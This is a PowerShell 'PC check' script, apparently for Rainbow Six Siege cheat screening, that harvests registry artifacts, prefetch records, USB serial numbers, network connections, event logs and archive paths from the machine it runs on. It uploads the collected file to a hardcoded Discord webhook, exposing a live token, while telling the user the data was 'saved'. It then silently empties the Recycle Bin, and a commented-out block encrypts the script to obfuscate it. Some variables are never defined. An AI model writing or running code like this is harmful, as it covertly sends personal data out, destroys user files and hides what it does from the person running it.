$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.WindowTitle = "Havoc"
Clear-Host

$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$outputFile = Join-Path -Path $desktopPath -ChildPath "Havoc.txt"
$logFilePath = $outputFile

function Get-OneDrivePath {
    try {
        # Attempt to retrieve OneDrive path from registry
        $oneDrivePath = Get-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive" -Name "UserFolder" -ErrorAction Stop | Select-Object -ExpandProperty UserFolder
    } catch {
        Write-Warning "OneDrive path not found in registry. Attempting alternative detection..."
        # Attempt to find OneDrive path using environment variables
        $envOneDrive = [System.IO.Path]::Combine($env:UserProfile, "OneDrive")
        if (Test-Path $envOneDrive) {
            $oneDrivePath = $envOneDrive
            Write-Host "OneDrive path detected using environment variable: $oneDrivePath" -ForegroundColor Red
        } else {
            Write-Error "Unable to find OneDrive path automatically."
            return $null
        }
    }
    return $oneDrivePath
}

function Format-Output {
    param($name, $value)
    $output = "{0} : {1}" -f $name, $value -replace 'System.Byte\[\]', ''
    if ($output -notmatch "Steam|Origin|EAPlay|FileSyncConfig.exe|OutlookForWindows") {
        return $output
    }
}

function Log-FolderNames {
    $userName = $env:UserName
    $oneDrivePath = Get-OneDrivePath
    $potentialPaths = @("C:\Users\$userName\Documents\My Games\Rainbow Six - Siege","$oneDrivePath\Documents\My Games\Rainbow Six - Siege")
    $allUserNames = @()

    foreach ($path in $potentialPaths) {
        if (Test-Path -Path $path) {
            $dirNames = Get-ChildItem -Path $path -Directory | ForEach-Object { $_.Name }
            $allUserNames += $dirNames
        }
    }

    $uniqueUserNames = $allUserNames | Select-Object -Unique

    if ($uniqueUserNames.Count -eq 0) {
        Write-Output "R6 directory not found."
    } else {
        return $uniqueUserNames
    }
}

function Find-SusFiles {
    Write-Host " [-] Finding suspicious files names..." -ForegroundColor Red
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "Havoc.txt"
    $susFilesHeader = "`n-----------------`nSus Files(Files with loader in their name):`n"
    $susFiles = @()

    if (Test-Path $outputFile) {
        $loggedFiles = Get-Content -Path $outputFile
        foreach ($file in $loggedFiles) {
            if ($file -match "loader.*\.exe") { $susFiles += $file }
        }

        if ($susFiles.Count -gt 0) {
            Add-Content -Path $outputFile -Value $susFilesHeader
            $susFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
        }
    } else {
        Write-Output "Log file not found. Unable to search for suspicious files."
    }
}

function Find-ZipRarFiles {
    Write-Host " [-] Finding .zip and .rar files. Please wait..." -ForegroundColor Red
    $zipRarFiles = @()
    $searchPaths = @($env:UserProfile, "$env:UserProfile\Downloads")
    $uniquePaths = @{}

    foreach ($path in $searchPaths) {
        if (Test-Path $path) {
            $files = Get-ChildItem -Path $path -Recurse -Include *.zip, *.rar -File
            foreach ($file in $files) {
                if (-not $uniquePaths.ContainsKey($file.FullName) -and $file.FullName -notmatch "minecraft") {
                    $uniquePaths[$file.FullName] = $true
                    $zipRarFiles += $file
                }
            }
        }
    }

    return $zipRarFiles
}

function List-BAMStateUserSettings {
    Write-Host " `n [-] Fetching" -ForegroundColor Red -NoNewline; Write-Host " UserSettings" -ForegroundColor White -NoNewline; Write-Host " Entries " -ForegroundColor Red
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "Havoc.txt"
    if (Test-Path $outputFile) { Clear-Content $outputFile }
    $loggedPaths = @{}

    $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
    $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like "*1001" }

    if ($userSettings) {
        foreach ($setting in $userSettings) {
            Add-Content -Path $outputFile -Value "`n$($setting.PSPath)"
            $items = Get-ItemProperty -Path $setting.PSPath | Select-Object -Property *
            foreach ($item in $items.PSObject.Properties) {
                if (($item.Name -match "exe" -or $item.Name -match ".rar") -and -not $loggedPaths.ContainsKey($item.Name) -and $item.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
                    Add-Content -Path $outputFile -Value (Format-Output $item.Name $item.Value)
                    $loggedPaths[$item.Name] = $true
                }
            }
        }
    } else {
        Write-Host " [-] No relevant user settings found." -ForegroundColor Red
    }

    Write-Host " [-] Fetching" -ForegroundColor Red -NoNewline; Write-Host " Compatibility Assistant" -ForegroundColor White -NoNewline; Write-Host " Entries" -ForegroundColor Red
    $compatRegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
    $compatEntries = Get-ItemProperty -Path $compatRegistryPath
    $compatEntries.PSObject.Properties | ForEach-Object {
        if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name) -and $_.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
            Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
            $loggedPaths[$_.Name] = $true
        }
    }

    Write-Host " [-] Fetching" -ForegroundColor Red -NoNewline; Write-Host " AppsSwitched" -ForegroundColor White -NoNewline; Write-Host " Entries" -ForegroundColor Red
    $newRegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched"
    if (Test-Path $newRegistryPath) {
        $newEntries = Get-ItemProperty -Path $newRegistryPath
        $newEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name) -and $_.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
                Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }

    Write-Host " [-] Fetching" -ForegroundColor Red -NoNewline; Write-Host " MuiCache" -ForegroundColor White -NoNewline; Write-Host " Entries" -ForegroundColor Red
    $muiCachePath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
    if (Test-Path $muiCachePath) {
        $muiCacheEntries = Get-ChildItem -Path $muiCachePath
        $muiCacheEntries.PSObject.Properties | ForEach-Object {
            if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name) -and $_.Name -notmatch "FileSyncConfig.exe|OutlookForWindows") {
                Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
                $loggedPaths[$_.Name] = $true
            }
        }
    }

    Get-Content $outputFile | Sort-Object | Get-Unique | Where-Object { $_ -notmatch "\{.*\}" } | ForEach-Object { $_ -replace ":", "" } | Set-Content $outputFile

    Log-BrowserFolders

    $folderNames = Log-FolderNames | Sort-Object | Get-Unique
    Add-Content -Path $outputFile -Value "`n==============="
    Add-Content -Path $outputFile -Value "`nR6 Usernames:"

    foreach ($name in $folderNames) {
        Add-Content -Path $outputFile -Value $name
        $url = "https://stats.cc/siege/$name"
        Write-Host " [-] Opening stats for $name on Stats.cc ..." -ForegroundColor Red
        Start-Process $url
        Start-Sleep -Seconds 0.5
    }
}

function Log-BrowserFolders {
    Write-Host " [-] Fetching" -ForegroundColor Red -NoNewline; Write-Host " reg entries" -ForegroundColor White -NoNewline; Write-Host " inside PowerShell..." -ForegroundColor Red
    $registryPath = "HKLM:\SOFTWARE\Clients\StartMenuInternet"
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "Havoc.txt"
    if (Test-Path $registryPath) {
        $browserFolders = Get-ChildItem -Path $registryPath
        Add-Content -Path $outputFile -Value "`n==============="
        Add-Content -Path $outputFile -Value "`nBrowser Folders:"
        foreach ($folder in $browserFolders) { Add-Content -Path $outputFile -Value $folder.Name }
    } else {
        Write-Host "Registry path for browsers not found." -ForegroundColor Red
    }
}

function Log-WindowsInstallDate {
    Write-Host " [-] Logging" -ForegroundColor Red -NoNewline; Write-Host " Windows install date" -ForegroundColor White -NoNewline; Write-Host "..." -ForegroundColor Red
    $os = Get-WmiObject -Class Win32_OperatingSystem
    $installDate = $os.ConvertToDateTime($os.InstallDate)
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "Havoc.txt"
    Add-Content -Path $outputFile -Value "`==============="
    Add-Content -Path $outputFile -Value "`nWindows Installation Date: $installDate"
}

function Check-RecentDocsForTlscan {
    Write-Host " [-] Checking" -ForegroundColor Red -NoNewline; Write-Host " for .tlscan" -ForegroundColor White -NoNewline; Write-Host " folders..." -ForegroundColor Red
    $recentDocsPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
    $tlscanFound = $false
    if (Test-Path $recentDocsPath) {
        $recentDocs = Get-ChildItem -Path $recentDocsPath
        foreach ($item in $recentDocs) {
            if ($item.PSChildName -match "\.tlscan") {
                $tlscanFound = $true
                $folderPath = Get-ItemProperty -Path "$recentDocsPath\$($item.PSChildName)" -Name MRUListEx
                $desktopPath = [System.Environment]::GetFolderPath('Desktop')
                $outputFile = Join-Path -Path $desktopPath -ChildPath "Havoc.txt"
                Add-Content -Path $outputFile -Value ".tlscan FOUND. DMA SETUP SOFTWARE DETECTED in $folderPath"
                Write-Host ".tlscan FOUND. DMA SETUP SOFTWARE DETECTED in $folderPath" -ForegroundColor Red
            }
        }
    }
    if (-not $tlscanFound) {
        Write-Host " [-] No .tlscan ext found." -ForegroundColor Red
    }
}

function Log-PrefetchFiles {
    Write-Host " [-] Fetching Last Ran Dates..." -ForegroundColor Red
    $prefetchPath = "C:\Windows\Prefetch"
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "Havoc.txt"
    $pfFilesHeader = "`n=======================`n.pf files:`n"

    if (Test-Path $prefetchPath) {
        $pfFiles = Get-ChildItem -Path $prefetchPath -Filter *.pf -File
        if ($pfFiles.Count -gt 0) {
            Add-Content -Path $outputFile -Value $pfFilesHeader
            $pfFiles | ForEach-Object {
                $logEntry = "{0} | {1}" -f $_.Name, $_.LastWriteTime
                Add-Content -Path $outputFile -Value $logEntry
            }
        } else {
            Write-Host "No .pf files found in the Prefetch folder." -ForegroundColor Green
        }
    } else {
        Write-Host "Prefetch folder not found." -ForegroundColor Red
    }
}

function Check-NetworkConnections {
    Write-Host " [-] Analyzing network connections..." -ForegroundColor Red
    $connections = Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' }
    $cheatNames = @('klar', 'linear', 'ring', 'lethal', 'eternity', 'aptitude', 'time2win', 'lynxtech', 'lavicheats', 'ruyzaq', 'skycheats', 'cosmocheats', 'veterancheats', 'chlorinecheats', 'leica', 'thermitehvh', 'apsmarket', 'forgive', 'nightfall', 'elysian', 'xerus')
    $suspiciousConnections = $connections | Where-Object {
        $_.RemoteAddress -match '^(192\.168|10\.|172\.(1[6-9]|2[0-9]|3[0-1]))' -or
        $_.RemotePort -in @(1337, 6969, 31337, 8080, 4444, 5555) -or
        $_.RemoteAddress -match '(cheat|hack|exploit|aimbot|wallhack)' -or
        $_.RemoteAddress -match '(\.ru$|\.cn$)' -or
        ($cheatNames | Where-Object { $_.RemoteAddress -match $_ }).Count -gt 0
    }
    if ($suspiciousConnections) {
        Add-Content -Path $outputFile -Value "`nSuspicious Network Connections:"
        $suspiciousConnections | ForEach-Object {
            Add-Content -Path $outputFile -Value "Process: $($_.OwningProcess) - Remote: $($_.RemoteAddress):$($_.RemotePort)"
        }
    }
}

function Check-Sandboxing {
    Write-Host " [-] Checking for sandboxing and virtualization..." -ForegroundColor Red
    $vmwarePresent = Get-WmiObject -Query "SELECT * FROM Win32_Process WHERE Name='vmwareservice.exe' OR Name='vmwaretray.exe'"
    $virtualBoxPresent = Get-WmiObject -Query "SELECT * FROM Win32_Process WHERE Name='VBoxService.exe' OR Name='VBoxTray.exe'"
    if ($vmwarePresent -or $virtualBoxPresent) {
        Add-Content -Path $outputFile -Value "`nVirtualization software detected:"
        if ($vmwarePresent) { Add-Content -Path $outputFile -Value "VMware detected" }
        if ($virtualBoxPresent) { Add-Content -Path $outputFile -Value "VirtualBox detected" }
    }
}

function AnalyzeUSBDevices {
    Write-Host " [-] Performing comprehensive USB device analysis..." -ForegroundColor Green
    
    $usbDevices = Get-WmiObject Win32_USBHub | Select-Object DeviceID, PNPDeviceID, Description
    $usbHistory = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR\*\*" | Select-Object FriendlyName, DeviceDesc, Mfg
    $usbStorage = Get-WmiObject Win32_DiskDrive | Where-Object {$_.InterfaceType -eq "USB"}
    $usbControllers = Get-WmiObject Win32_USBController
    $usbSetupClasses = Get-WmiObject Win32_PnPSignedDriver | Where-Object {$_.DeviceClass -eq "USB"}

    Add-Content -Path $outputFile -Value "`n=== USB Device Analysis ==="

    if ($usbDevices) {
        Add-Content -Path $outputFile -Value "`nCurrent USB Devices:"
        $usbDevices | ForEach-Object {
            Add-Content -Path $outputFile -Value "Device ID: $($_.DeviceID) | PNP Device ID: $($_.PNPDeviceID) | Description: $($_.Description)"
        }
    }

    if ($usbHistory) {
        Add-Content -Path $outputFile -Value "`nUSB Device History:"
        $usbHistory | ForEach-Object {
            Add-Content -Path $outputFile -Value "Friendly Name: $($_.FriendlyName) | Device Desc: $($_.DeviceDesc) | Manufacturer: $($_.Mfg)"
        }
    }

    if ($usbStorage) {
        Add-Content -Path $outputFile -Value "`nUSB Storage Devices:"
        $usbStorage | ForEach-Object {
            Add-Content -Path $outputFile -Value "Model: $($_.Model) | Serial: $($_.SerialNumber) | Size: $([math]::Round($_.Size / 1GB, 2)) GB"
        }
    }

    if ($usbControllers) {
        Add-Content -Path $outputFile -Value "`nUSB Controllers:"
        $usbControllers | ForEach-Object {
            Add-Content -Path $outputFile -Value "Name: $($_.Name) | Manufacturer: $($_.Manufacturer) | Status: $($_.Status)"
        }
    }

    if ($usbSetupClasses) {
        Add-Content -Path $outputFile -Value "`nUSB Device Setup Classes:"
        $usbSetupClasses | ForEach-Object {
            Add-Content -Path $outputFile -Value "Device Name: $($_.DeviceName) | Driver Name: $($_.DriverName) | Driver Version: $($_.DriverVersion)"
        }
    }

    if (-not ($usbDevices -or $usbHistory -or $usbStorage -or $usbControllers -or $usbSetupClasses)) {
        Add-Content -Path $outputFile -Value "`nNo USB devices or related information detected."
    }
}

function Expanded-RegistryScan {
    Write-Host " [-] Performing in-depth registry scan..." -ForegroundColor Red
    $suspiciousKeys = @(
        "HKCU:\Software\Cheat Engine 7.2",
        "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\Apps\730",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    )
    foreach ($key in $suspiciousKeys) {
        if (Test-Path $key) {
            $values = Get-ItemProperty -Path $key
            Add-Content -Path $outputFile -Value "`nSuspicious Registry Key: $key"
            $values.PSObject.Properties | ForEach-Object {
                if ($_.Name -notmatch "PS") {
                    Add-Content -Path $outputFile -Value "$($_.Name): $($_.Value)"
                }
            }
        }
    }
}

function Check-JournalDeletion {
    Write-Host " [-] Checking for journal deletion events..." -ForegroundColor Red
    $events = Get-WinEvent -FilterHashtable @{
        LogName = 'Security'
        ID = 3079
    } -ErrorAction SilentlyContinue

    if ($events) {
        Add-Content -Path $outputFile -Value "`nJournal Deletion Events Detected:"
        foreach ($event in $events) {
            $eventXml = [xml]$event.ToXml()
            $fileName = $eventXml.Event.EventData.Data | Where-Object { $_.Name -eq 'FileName' } | Select-Object -ExpandProperty '#text'
            $eventDetails = "Time: $($event.TimeCreated) | File: $fileName | Message: $($event.Message)"
            Add-Content -Path $outputFile -Value $eventDetails
        }
        Write-Host " [-] Journal deletion events found and logged." -ForegroundColor Yellow
    } else {
        Write-Host " [-] No journal deletion events detected." -ForegroundColor Red
    }
}

function Send-ToDiscord {
    param (
        [string]$webhookUrl,
        [string]$filePath = $null,
        [string]$message = $null
    )
    
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    
    $bodyLines = @()
    
    if ($message) {
        $bodyLines += @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"content`"",
            "Content-Type: text/plain$LF",
            $message
        )
    }
    
    if ($filePath) {
        $bodyLines += @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"Havoc.txt`"",
            "Content-Type: application/octet-stream$LF",
            [System.IO.File]::ReadAllText($filePath)
        )
    }
    
    $bodyLines += "--$boundary--$LF"
    $body = $bodyLines -join $LF
    
    try {
        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $body
        $null = $response
        Write-Host "Data saved successfully." -ForegroundColor Green
    } catch {
        Write-Host "Failed to send to Discord: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Main {
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
    $outputFile = Join-Path -Path $desktopPath -ChildPath "Havoc.txt"
    $logFilePath = $outputFile

    List-BAMStateUserSettings
    Log-WindowsInstallDate
    Find-SusFiles
    Check-RecentDocsForTlscan
    Log-PrefetchFiles
    Check-NetworkConnections
    Check-Sandboxing
    AnalyzeUSBDevices
    Expanded-RegistryScan
    Check-JournalDeletion

    $zipRarFiles = Find-ZipRarFiles
    if ($zipRarFiles.Count -gt 0) {
        Add-Content -Path $outputFile -Value "`n-----------------"
        Add-Content -Path $outputFile -Value "`nFound .zip and .rar files:"
        $zipRarFiles | ForEach-Object { Add-Content -Path $outputFile -Value $_.FullName }
    }

    $fileWebhookUrl = "https://discord.com/api/webhooks/1276239479325069333/eOy1Fqcw91sLv7rzHBWTD35BG_QBpYtYgLgKrJzMOPUxKBoQ8QVs4v7KT_WE0PUf1QQE"

    if (Test-Path $outputFile) {
    Send-ToDiscord -webhookUrl $fileWebhookUrl -filePath $outputFile -message "Discord Name: $discordName`nPotential Cheats: $formattedCheats"
    } else {
        Write-Host "Log file not found on the desktop." -ForegroundColor Red
    }

    $userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
    $downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"
    $targetFileDesktopPcCheck = Join-Path -Path $desktopPath -ChildPath "PcCheck.txt"
    $targetFileDownloadsPcCheck = Join-Path -Path $downloadsPath -ChildPath "PcCheck.txt"
    $targetFileDesktopMessage = Join-Path -Path $desktopPath -ChildPath "message.txt"
    $targetFileDownloadsMessage = Join-Path -Path $downloadsPath -ChildPath "message.txt"

    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}


$havocArt = @"
 _   _                                 . .  ,  ,
| | | |                               |` \/ \/ \,',
| |_| | __ ___   _____   ___          ;          ` \/\,.
|  _  |/ _` \ \ / / _ \ / __|        :               ` \,/
| | | | (_| |\ V / (_) | (__         |                  /
\_| |_/\__,_| \_/ \___/ \___|        ;                 :
                                    :                  ;
                                    |      ,---.      /
                                   :     ,'     `,-._ \
                                   ;    (   o    \   `'
                                 _:      .      ,'  o ;
                                /,.`      `.__,'`-.__,
                                \_  _               \
                               ,'  / `,          `.,'
                         ___,'`-._ \_/ `,._        ;
                      __;_,'      `-.`-'./ `--.____)
                   ,-'           _,--\^-'
                 ,:_____      ,-'     \
                (,'     `--.  \;-._    ;
                :    Y      `-/    `,  :
                :    :       :     /_;'
                :    :       |    :
                 \    \      :    :
                  `-._ `-.__, \    `.
                     \   \  `. \     `.
                   ,-;    \---)_\ ,','/
                   \_ `---'--'" ,'^-;'
                   (_`     ---'" ,-')
                   / `--.__,. ,-'    \
          -hrr-    )-.__,-- ||___,--' `-.
                  /._______,|__________,'\
                  `--.____,'|_________,-'
"@

Write-Host $havocArt -ForegroundColor Red
$discordName = Read-Host "Please enter your Discord name"
Main


#function Custom-Obfuscate {
#    param([string]$script)
#    $key = [byte[]](1..32)
#    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
#    $rng.GetBytes($key)
#    
#    $aes = New-Object System.Security.Cryptography.AesManaged
#    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
#    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
#    $aes.Key = $key
#    $aes.GenerateIV()
#
#    #$scriptToObfuscate = $script -replace '(?s)function Custom-Obfuscate.*?}', ''
#
#    $msEncrypt = New-Object System.IO.MemoryStream
#    $csEncrypt = New-Object System.Security.Cryptography.CryptoStream($msEncrypt, $aes.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)
#    $swEncrypt = New-Object System.IO.StreamWriter($csEncrypt)
#    $swEncrypt.Write($script)
#    $swEncrypt.Close()
#    $csEncrypt.Close()
#    
#    $encrypted = $msEncrypt.ToArray()
#    $result = @($key, $aes.IV, $encrypted) | ForEach-Object { [Convert]::ToBase64String($_) }
#    return "powershell -c `"$($result -join ',')`""
#}
#
#$scriptContent = Get-Content -Path "c:\Users\kyle1\Desktop\Havoc\Havoc.ps1" -Raw
#$obfuscatedScript = Custom-Obfuscate -script $scriptContent
#$obfuscatedScript | Out-File -FilePath "c:\Users\kyle1\Desktop\ObfuscatedHavoc.txt"
